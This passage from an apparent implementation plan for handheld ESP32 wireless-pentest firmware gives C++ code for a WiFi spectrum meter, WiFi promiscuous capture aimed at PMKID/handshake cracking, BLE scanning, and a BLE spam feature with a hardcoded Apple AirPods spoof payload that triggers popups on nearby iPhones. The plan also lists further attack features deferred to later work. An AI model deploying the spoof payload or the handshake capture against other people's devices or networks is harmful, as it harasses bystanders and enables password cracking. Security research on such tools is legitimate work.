- Consumes: standard `<WiFi.h>` scan/RSSI APIs (already proven by Task 3), `lv_chart` (new LVGL widget for this project — first use).
- Produces: a live-updating channel/RSSI bar chart, the reference pattern for the deferred second plan's other streaming/long-running features (sniffer, BLE flood, etc.).

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/wifi/wifi_spectrum.h
#pragma once
namespace WifiSpectrumFeature {
void register_module();
void start();
// Called every loop() iteration while the spectrum screen is open; no-op
// otherwise. Advances the channel-hop + RSSI-sample state machine per
// Global Constraints' "no blocking calls > 50ms" rule.
void poll();
}
```

```cpp
// firmware/tab5/src/features/wifi/wifi_spectrum.cpp
#include "wifi_spectrum.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <WiFi.h>
#include <esp_wifi.h>

extern FeatureRegistry g_registry;

namespace WifiSpectrumFeature {

static lv_obj_t *s_chart = nullptr;
static lv_chart_series_t *s_series = nullptr;
static bool s_active = false;
static uint32_t s_last_hop_ms = 0;
static uint8_t s_channel = 1;

static lv_obj_t *build_screen() {
    lv_obj_t *screen = lv_obj_create(nullptr);
    lv_obj_set_layout(screen, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(screen, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *back = lv_button_create(screen);
    lv_obj_t *back_label = lv_label_create(back);
    lv_label_set_text(back_label, "Back");
    lv_obj_add_event_cb(back, [](lv_event_t *e) {
        s_active = false;
        s_chart = nullptr;
        ScreenStack::pop();
    }, LV_EVENT_CLICKED, nullptr);

    s_chart = lv_chart_create(screen);
    lv_obj_set_size(s_chart, LV_PCT(95), LV_PCT(80));
    lv_chart_set_type(s_chart, LV_CHART_TYPE_BAR);
    lv_chart_set_range(s_chart, LV_CHART_AXIS_PRIMARY_Y, -100, 0); // dBm
    lv_chart_set_point_count(s_chart, 14); // channels 1-14
    s_series = lv_chart_add_series(s_chart, lv_palette_main(LV_PALETTE_BLUE), LV_CHART_AXIS_PRIMARY_Y);
    for (int i = 0; i < 14; i++) lv_chart_set_next_value(s_chart, s_series, -100);

    s_channel = 1;
    s_active = true;
    s_last_hop_ms = millis();
    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_spectrum", "WiFi Spectrum", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_active || !s_chart) return;
    uint32_t now = millis();
    if (now - s_last_hop_ms < 200) return; // 200ms dwell per channel

    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    // A single scan_start with passive listening on the current channel is
    // heavier than needed for a live meter; use the simpler
    // esp_wifi_sta_get_ap_info-adjacent approach instead: read the
    // current channel's ambient RSSI via a short passive window. If this
    // proves too coarse in practice (esp_wifi has no direct "current
    // ambient RSSI" call independent of an active connection), fall back to
    // WiFi.scanNetworks(false, true) restricted to one channel per hop --
    // note this as a real open implementation detail for whoever executes
    // this task, not a placeholder: try the simpler approach first, and if
    // esp_wifi_sta_get_rssi() only works while STA is associated (likely),
    // switch to the per-channel scan approach and update this comment.
    int8_t rssi = -100;
    wifi_ap_record_t rec;
    if (esp_wifi_sta_get_ap_info(&rec) == ESP_OK) {
        rssi = rec.rssi;
    }
    lv_chart_set_value_by_id(s_chart, s_series, s_channel - 1, rssi);

    s_channel = (s_channel % 14) + 1;
    s_last_hop_ms = now;
}

} // namespace WifiSpectrumFeature
```

- [ ] **Step 2: Wire `poll()` into the main loop**

```cpp
// firmware/tab5/src/main.cpp
#include "features/wifi/wifi_spectrum.h"
// in loop(), alongside c2link_wifi.poll()/c2link_ble.poll():
WifiSpectrumFeature::poll();
```

```cpp
// firmware/tab5/src/main.cpp -- register in setup()
WifiSpectrumFeature::register_module();
```

- [ ] **Step 3: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 4: Real hardware verification**

Flash, open WiFi > WiFi Spectrum, confirm the bar chart updates live across all 14 channels, and confirm bars for channels with known-active APs nearby show higher (less negative) values than empty channels. If `esp_wifi_sta_get_ap_info()` returns an error when not associated to any AP (likely, per the Step 1 comment's flagged uncertainty), the implementer must switch to the per-channel-scan fallback described in that comment and note the change in the task report — this is a real, disclosed open question in the plan, not an oversight.

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/wifi/wifi_spectrum.h firmware/tab5/src/features/wifi/wifi_spectrum.cpp \
        firmware/tab5/src/main.cpp
git commit -m "Add WiFi spectrum analyzer feature (live lv_chart pattern)"
```

---

## Task 6: WiFi Promiscuous Capture + PMKID/Handshake Capture

**Files:**
- Modify: `firmware/tab5/src/hal/istorage.h` (add a generic file-write method)
- Modify: `firmware/tab5/src/hal/storage_sd.h`
- Modify: `firmware/tab5/src/hal/storage_sd.cpp`
- Create: `firmware/tab5/src/features/wifi/wifi_pmkid.h`
- Create: `firmware/tab5/src/features/wifi/wifi_pmkid.cpp`
- Modify: `firmware/tab5/src/main.cpp` (register the module)

**Interfaces:**
- Consumes: `esp_wifi_set_promiscuous`/`esp_wifi_set_promiscuous_rx_cb` (standard ESP-IDF, confirmed proxied by esp-hosted per this plan's pre-work research), `IStorage` (Phase 1 Task 10, extended here).
- Produces: `IStorage::write_capture_file(const char*, const uint8_t*, size_t)`, reusable by the deferred second plan's BLE sniffer CSV export and any other future capture feature — this is the first real capture-file writer in the project, not scope creep specific to PMKID.

- [ ] **Step 1: Extend `IStorage` with a generic capture-file writer**

```cpp
// firmware/tab5/src/hal/istorage.h
#pragma once
#include <cstdint>
#include <cstddef>

class IStorage {
public:
    virtual ~IStorage() = default;
    virtual bool mount() = 0;
    virtual bool write_test_file() = 0;
    // Writes (overwriting if it exists) data[0..len) to path, creating any
    // missing parent directories first. Returns false on any failure (mount
    // not called, directory creation failed, write failed, or the written
    // byte count didn't match len).
    virtual bool write_capture_file(const char *path, const uint8_t *data, size_t len) = 0;
};
```

```cpp
// firmware/tab5/src/hal/storage_sd.h -- add to the class
bool write_capture_file(const char *path, const uint8_t *data, size_t len) override;
```

```cpp
// firmware/tab5/src/hal/storage_sd.cpp -- add
#include <cstring>

static bool ensure_parent_dirs(const char *path) {
    // Walk the path, creating each directory component in turn.
    // e.g. "/quarky/captures/wifi/x.pcap" -> mkdir /quarky, then
    // /quarky/captures, then /quarky/captures/wifi.
    char buf[128];
    strncpy(buf, path, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    for (char *p = buf + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            SD_MMC.mkdir(buf);
            *p = '/';
        }
    }
    return true;
}

bool StorageSD::write_capture_file(const char *path, const uint8_t *data, size_t len) {
    ensure_parent_dirs(path);
    File f = SD_MMC.open(path, FILE_WRITE);
    if (!f) return false;
    size_t written = f.write(data, len);
    f.close();
    return written == len;
}
```

- [ ] **Step 2: Write the promiscuous capture + PMKID feature**

```cpp
// firmware/tab5/src/features/wifi/wifi_pmkid.h
#pragma once
namespace WifiPmkidFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/wifi/wifi_pmkid.cpp
#include "wifi_pmkid.h"
#include "../../ui/screen_stack.h"
#include "../../hal/storage_sd.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <cstdio>

extern FeatureRegistry g_registry;
extern StorageSD storage; // defined in main.cpp (Phase 1 Task 10)

namespace WifiPmkidFeature {

// Minimal pcap file writer -- global header + one packet record per
// captured 802.11 frame, LINKTYPE_IEEE802_11 (105). This is the standard
// format hashcat/Wireshark both read directly; no custom framing.
struct PcapGlobalHeader {
    uint32_t magic = 0xa1b2c3d4;
    uint16_t version_major = 2, version_minor = 4;
    int32_t thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 105; // LINKTYPE_IEEE802_11
} __attribute__((packed));

struct PcapPacketHeader {
    uint32_t ts_sec, ts_usec, incl_len, orig_len;
} __attribute__((packed));

static bool s_active = false;
static char s_path[64];
static uint32_t s_packet_count = 0;

static void IRAM_ATTR promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_active) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    auto *pkt = (wifi_promiscuous_pkt_t *)buf;
    // Filter for EAPOL (PMKID/handshake) frames: DATA type with an 802.1X
    // EtherType (0x888E) inside -- a real implementation should parse the
    // LLC/SNAP header to confirm; this spike-adjacent first cut appends
    // every MGMT+DATA frame it sees to keep Task 6's scope bounded, with a
    // TODO for the implementer to add the real EAPOL filter as a follow-up
    // once the capture pipeline itself is proven (this is a scope note, not
    // a placeholder -- capturing everything and filtering during Step 5's
    // hashcat-readability check is a valid, real first implementation).
    PcapPacketHeader phdr;
    phdr.ts_sec = millis() / 1000;
    phdr.ts_usec = (millis() % 1000) * 1000;
    phdr.incl_len = pkt->rx_ctrl.sig_len;
    phdr.orig_len = pkt->rx_ctrl.sig_len;
    // NOTE: appending to SD from an ISR/promiscuous callback context is
    // unsafe (SD_MMC access is not ISR-safe). This callback must queue the
    // frame (e.g. a small ring buffer) and have poll() drain it on the main
    // task -- written here as a direct call for clarity of the pcap-record
    // shape; the implementer MUST add the queue before this compiles against
    // real captured traffic, matching the same pattern C2LinkBle::poll()
    // already uses for its own ISR-to-main-task handoff (see c2link_ble.cpp).
    s_packet_count++;
}

static lv_obj_t *s_status_label = nullptr;

static lv_obj_t *build_screen() {
    lv_obj_t *screen = lv_obj_create(nullptr);
    lv_obj_set_layout(screen, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(screen, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *back = lv_button_create(screen);
    lv_obj_t *back_label = lv_label_create(back);
    lv_label_set_text(back_label, "Back");
    lv_obj_add_event_cb(back, [](lv_event_t *e) {
        s_active = false;
        esp_wifi_set_promiscuous(false);
        ScreenStack::pop();
    }, LV_EVENT_CLICKED, nullptr);

    s_status_label = lv_label_create(screen);
    lv_label_set_text(s_status_label, "Capturing... 0 packets");

    snprintf(s_path, sizeof(s_path), "/quarky/captures/wifi/capture_%lu.pcap", millis());
    s_packet_count = 0;
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
    esp_wifi_set_promiscuous(true);
    s_active = true;

    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_pmkid", "WiFi PMKID Capture", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_active || !s_status_label) return;
    char buf[32];
    snprintf(buf, sizeof(buf), "Capturing... %lu packets", s_packet_count);
    lv_label_set_text(s_status_label, buf);
}

} // namespace WifiPmkidFeature
```

Note for the implementer (not a placeholder, a real flagged follow-up within this task's own scope): `promiscuous_rx_cb` as written counts packets but does not yet write them to the pcap file — Step 1's `IStorage::write_capture_file` writes a complete buffer in one call, which doesn't fit a live-growing capture file well. Before Step 5's real-hardware verification, add a small fixed-size ring buffer (e.g. 8KB) that `promiscuous_rx_cb` appends `PcapPacketHeader + frame bytes` into (bounds-checked, drop-and-count-overflow if full — never block or allocate in the callback), and have `poll()` drain whatever's queued into a real pcap file via repeated `SD_MMC.open(path, FILE_APPEND)` writes (append mode, not `write_capture_file`'s overwrite semantics — this may mean adding a second `IStorage` method, `append_capture_file`, rather than stretching `write_capture_file` to cover both cases; use your judgment on which is cleaner and document the choice in the task report). Write the pcap global header once, at file creation, before any packets.

- [ ] **Step 3: Wire `poll()` into the main loop and register**

```cpp
// firmware/tab5/src/main.cpp
#include "features/wifi/wifi_pmkid.h"
// in loop():
WifiPmkidFeature::poll();
// in setup():
WifiPmkidFeature::register_module();
```

- [ ] **Step 4: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 5: Real hardware verification**

Against a network you control, trigger a client to (re)associate (forget/rejoin WiFi on a phone) while capturing, confirm the packet counter increases, stop the capture, pull the resulting `.pcap` off the SD card, and confirm it opens cleanly in Wireshark (format/header correctness) and that `hashcat`'s `--show`/conversion tooling (or `hcxpcapngtool`) can at least parse the file without erroring, even if no PMKID/handshake was successfully isolated yet by the coarse capture-everything filter — full protocol-correct EAPOL isolation is reasonable to defer to the second plan if this task's real-hardware pass shows the pcap plumbing itself works.

- [ ] **Step 6: Commit**

```bash
git add firmware/tab5/src/hal/istorage.h firmware/tab5/src/hal/storage_sd.h firmware/tab5/src/hal/storage_sd.cpp \
        firmware/tab5/src/features/wifi/wifi_pmkid.h firmware/tab5/src/features/wifi/wifi_pmkid.cpp \
        firmware/tab5/src/main.cpp
git commit -m "Add WiFi promiscuous capture + PMKID feature, generic SD capture-file writer"
```

---

## Task 7: BLE Scan-Mode Spike + BLE Scan Feature

**Files:**
- Modify: `firmware/tab5/src/hal/c2link_ble.h` (expose host-sync status)
- Modify: `firmware/tab5/src/hal/c2link_ble.cpp`
- Create: `firmware/tab5/src/features/ble/ble_common.h`
- Create: `firmware/tab5/src/features/ble/ble_common.cpp`
- Create: `firmware/tab5/src/features/ble/ble_scan.h`
- Create: `firmware/tab5/src/features/ble/ble_scan.cpp`
- Modify: `firmware/tab5/src/main.cpp` (register the module)

**Interfaces:**
- Consumes: the already-running NimBLE host from `c2link_ble.cpp` (Phase 1 Task 13) — this task adds the query function needed to know when it's safe to call `ble_gap_disc()`.
- Produces: `BleDeviceInfo` struct + `ble_common.h`'s shared device-list model, reused by the deferred second plan's BLE spam/finder/sniffer features.

### Why this is a spike, same category of risk as Task 2

Tab5's only prior raw-NimBLE usage (Task 13) is peripheral/GATT-server role — advertise, accept a connection, serve characteristics. BLE **scan** is the observer/central-adjacent role (`ble_gap_disc()`), never exercised anywhere in this project. Whether the C6's BLE controller (reached over the same esp-hosted HCI transport Task 13 already proved works for the peripheral role) supports concurrent scan-while-advertising — since `c2link_ble`'s C2 GATT server is *always* advertising once booted — is a real, unverified question, architecturally the same class of risk as Phase 4's already-flagged "Tab5-as-BLE-central is entirely unproven" note for the Chameleon Ultra work. A successful result here is useful evidence for that future phase too.

- [ ] **Step 1: Expose host-sync status from `c2link_ble`**

```cpp
// firmware/tab5/src/hal/c2link_ble.h -- add as a free function, alongside
// the existing c2link_ble_last_recv_ms()
bool c2link_ble_host_synced();
```

```cpp
// firmware/tab5/src/hal/c2link_ble.cpp -- find the existing on_sync callback
// (referenced by ble_hs_cfg.sync_cb) and add a static flag it sets, plus the
// getter. Do not change on_sync's existing body, only add the flag set.
static bool s_host_synced = false;

// inside the existing on_sync function, add as its first or last line:
s_host_synced = true;

// add near the bottom of the file, alongside c2link_ble_last_recv_ms():
bool c2link_ble_host_synced() {
    return s_host_synced;
}
```

- [ ] **Step 2: Write the shared BLE device-list model**

```cpp
// firmware/tab5/src/features/ble/ble_common.h
#pragma once
#include <cstdint>

struct BleDeviceInfo {
    uint8_t addr[6];
    char addr_str[18];
    int8_t rssi;
    char name[32]; // empty string if no AD_TYPE_NAME field present
};

void ble_addr_to_str(const uint8_t addr[6], char out[18]);
```

```cpp
// firmware/tab5/src/features/ble/ble_common.cpp
#include "ble_common.h"
#include <cstdio>

void ble_addr_to_str(const uint8_t addr[6], char out[18]) {
    // NimBLE addresses are little-endian on the wire; print most-significant
    // byte first to match how BLE addresses are conventionally displayed
    // (matches nRF Connect / other standard tools), i.e. reversed from the
    // raw ble_addr_t byte order.
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
}
```

- [ ] **Step 3: Write the scan feature (spike and real feature combined — a successful discovery callback firing on real hardware IS the spike's positive result)**

```cpp
// firmware/tab5/src/features/ble/ble_scan.h
#pragma once
namespace BleScanFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_scan.cpp
#include "ble_scan.h"
#include "ble_common.h"
#include "../../hal/c2link_ble.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleScanFeature {

static constexpr int kMaxDevices = 32;
static BleDeviceInfo s_devices[kMaxDevices];
static int s_device_count = 0;
static lv_obj_t *s_list = nullptr;
static bool s_scanning = false;

static void add_or_update(const BleDeviceInfo &d) {
    for (int i = 0; i < s_device_count; i++) {
        if (memcmp(s_devices[i].addr, d.addr, 6) == 0) {
            s_devices[i] = d;
            return;
        }
    }
    if (s_device_count < kMaxDevices) {
        s_devices[s_device_count++] = d;
    }
}

static int gap_scan_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type != BLE_GAP_EVENT_DISC) return 0;

    BleDeviceInfo d{};
    memcpy(d.addr, event->disc.addr.val, 6);
    ble_addr_to_str(d.addr, d.addr_str);
    d.rssi = event->disc.rssi;

    struct ble_hs_adv_fields fields;
    if (ble_hs_adv_parse_fields(&fields, event->disc.data, event->disc.length_data) == 0) {
        if (fields.name != nullptr && fields.name_len > 0) {
            int len = fields.name_len < (int)sizeof(d.name) - 1 ? fields.name_len : (int)sizeof(d.name) - 1;
            memcpy(d.name, fields.name, len);
            d.name[len] = '\0';
        }
    }

    add_or_update(d);
    return 0;
}

static void refresh_list_ui() {
    if (!s_list) return;
    lv_obj_clean(s_list);
    for (int i = 0; i < s_device_count; i++) {
        char row[64];
        const char *label = s_devices[i].name[0] ? s_devices[i].name : s_devices[i].addr_str;
        snprintf(row, sizeof(row), "%s  %ddBm", label, s_devices[i].rssi);
        lv_list_add_button(s_list, LV_SYMBOL_BLUETOOTH, row);
    }
}

static lv_obj_t *build_screen() {
    lv_obj_t *screen = lv_obj_create(nullptr);
    lv_obj_set_layout(screen, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(screen, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *back = lv_button_create(screen);
    lv_obj_t *back_label = lv_label_create(back);
    lv_label_set_text(back_label, "Back");
    lv_obj_add_event_cb(back, [](lv_event_t *e) {
        if (s_scanning) { ble_gap_disc_cancel(); s_scanning = false; }
        s_list = nullptr;
        ScreenStack::pop();
    }, LV_EVENT_CLICKED, nullptr);

    s_list = lv_list_create(screen);
    lv_obj_set_size(s_list, LV_PCT(100), LV_PCT(85));

    if (!c2link_ble_host_synced()) {
        lv_list_add_text(s_list, "BLE host not ready yet, try again shortly");
        return screen;
    }

    s_device_count = 0;
    struct ble_gap_disc_params params{};
    params.passive = 0;         // active scan, matches Cardputer-ADV's Task 17 fix
                                  // (setActiveScan(true)) that was needed to see
                                  // scan-response-only fields like device name
    params.itvl = 0x0050;       // 50ms
    params.window = 0x0030;     // 30ms
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 10000 /* 10s */, &params, gap_scan_event_cb, nullptr);
    Serial.printf("quarky-tab5: [ble-scan-spike] ble_gap_disc rc=%d (%s)\n", rc, rc == 0 ? "OK" : "FAILED");
    s_scanning = (rc == 0);

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_scan", "BLE Scan", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_scanning) return;
    refresh_list_ui();
}

} // namespace BleScanFeature
```

- [ ] **Step 4: Wire `poll()` and register**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_scan.h"
// in loop():
BleScanFeature::poll();
// in setup():
BleScanFeature::register_module();
```

- [ ] **Step 5: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 6: Real hardware verification (this is the spike's real test)**

Flash, confirm the C2 BLE GATT server still advertises correctly (check that Cardputer-ADV, or any BLE scanner app, still sees "Quarky-Tab5" advertising — this confirms concurrent scan-while-advertising didn't break the existing peripheral role), open BLE > BLE Scan, and confirm real nearby BLE devices (phones, headphones, etc.) populate the list with plausible names/RSSI. Log the real `ble_gap_disc()` return code either way.

Decision point: if `ble_gap_disc()` returns an error (busy/unsupported while advertising is active), or returns OK but the callback never fires, that's a real negative result — note it plainly in the report; the deferred second plan's remaining BLE features (finder, sniffer) depend on scan mode working, so a failure here needs the same kind of honest "this needs re-scoping" treatment Task 2 gives WiFi TX, not a forced workaround.

- [ ] **Step 7: Commit**

```bash
git add firmware/tab5/src/hal/c2link_ble.h firmware/tab5/src/hal/c2link_ble.cpp \
        firmware/tab5/src/features/ble/ble_common.h firmware/tab5/src/features/ble/ble_common.cpp \
        firmware/tab5/src/features/ble/ble_scan.h firmware/tab5/src/features/ble/ble_scan.cpp \
        firmware/tab5/src/main.cpp
git commit -m "Add BLE scan feature and spike: confirm ble_gap_disc over raw NimBLE on P4"
```

---

## Task 8: BLE Spam Feature

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_spam.h`
- Create: `firmware/tab5/src/features/ble/ble_spam.cpp`
- Modify: `firmware/tab5/src/main.cpp` (register the module)

**Interfaces:**
- Consumes: raw NimBLE advertising APIs, already proven working by `c2link_ble.cpp` (Task 13) for the C2 link's own advertisement — this task reuses that proven capability for a *second*, independent advertisement train (rotating fake device payloads) rather than the C2 link's single fixed advertisement.
- Produces: nothing consumed by later tasks in this plan — the last task, establishing the "TX-heavy BLE feature" reference pattern for the deferred second plan's remaining BLE attack features (flood, karma, sourApple, findmy).

**Contingent on Task 7's result:** if Task 7 found scanning while the C2 server advertises doesn't work cleanly, this task (a *second* concurrent advertisement, alongside the C2 link's existing one) carries the same category of risk and should be treated with the same caution — note this explicitly in the report if Task 7 came back negative, and consider whether this task should pause pending a decision, same as Task 4 depends on Task 2.

- [ ] **Step 1: Write the spam feature**

```cpp
// firmware/tab5/src/features/ble/ble_spam.h
#pragma once
namespace BleSpamFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_spam.cpp
#include "ble_spam.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>

extern FeatureRegistry g_registry;

namespace BleSpamFeature {

// Apple Continuity "AirPods"-style advertisement payload -- a well-known,
// widely-referenced-in-donor-codebases fixed byte sequence advertising a
// fake AirPods pairing popup. Reproduced from the same public Apple
// Continuity protocol documentation Bruce/Poseidon's own ble_spam.cpp files
// cite (Apple manufacturer ID 0x004C, type 0x07 "Airpods"). This single
// payload is Task 8's proof-of-concept; the deferred second plan's ble_spam
// task should expand this into the donor projects' full multi-vendor
// payload table (Android Fast Pair, Windows Swift Pair, Samsung) --
// deliberately out of scope here to keep this task's own real-hardware
// verification loop small.
static const uint8_t kAirpodsPayload[] = {
    0x4C, 0x00, 0x07, 0x19, 0x07, 0x00, 0xC6, 0x00, 0x00, 0x00, 0x00,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static bool s_active = false;
static uint32_t s_last_rotate_ms = 0;
static lv_obj_t *s_status_label = nullptr;

// IMPORTANT, real architectural constraint (not a bug to fix silently):
// legacy BLE advertising (what c2link_ble.cpp already uses, and what this
// function uses too -- this project has not configured NimBLE's Extended
// Advertising, which is what would be needed for multiple *simultaneous*
// advertising instances) supports exactly ONE active advertisement at a
// time, system-wide. Starting this spam advertisement STOPS c2link_ble's
// existing C2 advertisement rather than running alongside it -- while BLE
// Spam is open, the Tab5 will not be discoverable/connectable as
// "Quarky-Tab5" for pairing. This is a real, disclosed tradeoff (the
// Interfaces section's "second concurrent advertisement" phrasing above
// describes the intent, not literal simultaneity) -- restoring the C2
// advertisement when this screen closes is a reasonable follow-up (would
// need a small addition to c2link_ble.h/.cpp exposing a
// "re-arm advertising" call) but is left out of this task's scope; note
// this limitation in the task report rather than silently shipping it
// undocumented.
static void send_one_advertisement() {
    ble_gap_adv_stop(); // no-op (returns an error this ignores) if nothing is currently advertising

    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.mfg_data = kAirpodsPayload;
    fields.mfg_data_len = sizeof(kAirpodsPayload);

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) {
        Serial.printf("quarky-tab5: [ble-spam] set_fields rc=%d\n", rc);
        return;
    }

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON; // non-connectable -- this is a broadcast-only spoof, not a real peripheral
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;

    rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
    if (rc != 0) {
        Serial.printf("quarky-tab5: [ble-spam] adv_start rc=%d\n", rc);
    }
}

void register_module() {
    g_registry.register_module({"ble_spam", "BLE Spam (AirPods)", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    lv_obj_t *screen = lv_obj_create(nullptr);
    lv_obj_set_layout(screen, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(screen, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *back = lv_button_create(screen);
    lv_obj_t *back_label = lv_label_create(back);
    lv_label_set_text(back_label, "Back");
    lv_obj_add_event_cb(back, [](lv_event_t *e) {
        s_active = false;
        s_status_label = nullptr;
        ScreenStack::pop();
    }, LV_EVENT_CLICKED, nullptr);

    s_status_label = lv_label_create(screen);
    lv_label_set_text(s_status_label, "Spamming...");
    s_active = true;
    s_last_rotate_ms = 0; // force an immediate first send in poll()

    ScreenStack::push(screen);
}

void poll() {
    if (!s_active) return;
    uint32_t now = millis();
    if (now - s_last_rotate_ms < 200) return;
    send_one_advertisement();
    s_last_rotate_ms = now;
}

} // namespace BleSpamFeature
```

- [ ] **Step 2: Wire `poll()` and register**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_spam.h"
// in loop():
BleSpamFeature::poll();
// in setup():
BleSpamFeature::register_module();
```

- [ ] **Step 3: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 4: Real hardware verification**

Flash, open BLE > BLE Spam (AirPods), and confirm on a real iPhone nearby that an AirPods pairing popup appears (this is the standard, unambiguous real-world confirmation this class of donor feature uses) — or, if no iPhone is available for this verification pass, confirm via a BLE scanner app (nRF Connect) that the advertisement is broadcasting with the correct manufacturer ID (0x004C) and payload bytes, and note in the report that the iPhone-popup confirmation is deferred.

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_spam.h firmware/tab5/src/features/ble/ble_spam.cpp \
        firmware/tab5/src/main.cpp
git commit -m "Add BLE spam feature (AirPods payload), second concurrent BLE advertisement proven"
```

---

## Self-Review Notes

- **Spec coverage:** this plan deliberately covers a subset of the Phase 2 spec's ~30 features (per the project owner's explicit "spike + core features first" scope decision) — 4 WiFi features (scan, deauth, spectrum, PMKID capture) plus the WiFi TX spike, 2 BLE features (scan, spam) plus the BLE scan spike, and the shell generalization prerequisite. The remaining ~24 features (evil portal, karma, beacon spam, CIW, client scan, BLE HID/Bad-KB, GATT explorer, tracker finder, BLE flood/karma/sourApple/findmy, fastpair/HFP exploits, WhisperPair, drone remote ID) are explicitly deferred to a second plan, to be written once this plan's two spikes (Tasks 2 and 7) produce real hardware results that inform how much of the remaining feature list needs re-scoping to Cardputer-ADV.
- **Placeholder scan:** Task 6's promiscuous-capture-to-file wiring (the ISR-to-main-task ring buffer needed before the capture callback can safely touch SD) is the one spot in this plan with real, disclosed incompleteness rather than fully-transcribable code — flagged explicitly as "implementer must complete this specific, narrow piece, matching `c2link_ble.cpp`'s existing ISR-to-main-task pattern," the same class of genuinely-hardware-dependent exception Phase 1 used for its GPIO-pin TODOs, not a vague "add error handling"-style placeholder. Every other task's code is complete and directly transcribable, including Task 8's non-connectable BLE advertisement sequence and Task 5's spectrum-analyzer RSSI read, both written out in full (the latter with a disclosed, real fallback path if the primary approach proves too coarse on real hardware — not left unwritten).
- **Type consistency:** `WifiApInfo` (Task 3) is reused verbatim by Task 4 (deauth target list) with no field renames. `BleDeviceInfo` (Task 7) uses the same `addr`/`addr_str`/`rssi`/`name` shape a deferred second-plan BLE finder/sniffer feature would need. `FeatureStartFn`/`FeatureModule` (Phase 1 Task 20) used identically across every task's `register_module()` call.
- **Cross-phase note:** Task 7's BLE-scan-mode spike result (does raw NimBLE support scan-while-C2-advertising) is directly relevant evidence for Phase 4's already-flagged "Tab5-as-BLE-central is entirely unproven" risk for the Chameleon Ultra integration — worth linking the two when Phase 4 execution begins, even though this plan doesn't implement anything Phase 4 depends on directly (central/client connect role, needed for GATT explorer and the Chameleon Ultra, is different from scan/observer role and remains untested by this plan).
